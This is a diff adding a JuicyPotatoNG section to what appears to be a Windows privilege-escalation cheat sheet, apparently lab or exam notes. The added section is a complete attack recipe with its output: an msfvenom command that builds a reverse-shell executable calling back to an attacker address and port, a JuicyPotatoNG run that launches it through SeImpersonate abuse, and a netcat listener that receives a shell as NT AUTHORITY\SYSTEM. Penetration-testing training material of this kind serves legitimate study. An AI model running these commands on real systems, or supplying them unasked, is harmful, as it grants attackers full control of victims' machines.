@@ -1875,6 +1875,36 @@ C:\Windows\System32\cmd.exe #or find the file in the file system and run it as A
 [right click and run as administrator]
 ````
 ### SeImpersonate
+#### JuicyPotatoNG
+````
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=1337 EXITFUNC=thread -f exe --platform windows -o rshell.exe
+cp /opt/juicyPotato/JuicyPotatoNG.exe .
+````
+````
+PS C:\Windows\Temp> .\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe
+.\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe
+
+
+         JuicyPotatoNG
+         by decoder_it & splinter_code
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
+[+] CreateProcessAsUser OK
+[+] Exploit successful!
+
+
+
+nc -nlvp 1337                                                                                                                     
+listening on [any] 1337 ...
+connect to [192.168.119.138] from (UNKNOWN) [192.168.138.248] 52803
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\>whoami
+whoami
+nt authority\system
+````
 #### PrintSpoofer
 ````
 whoami /priv
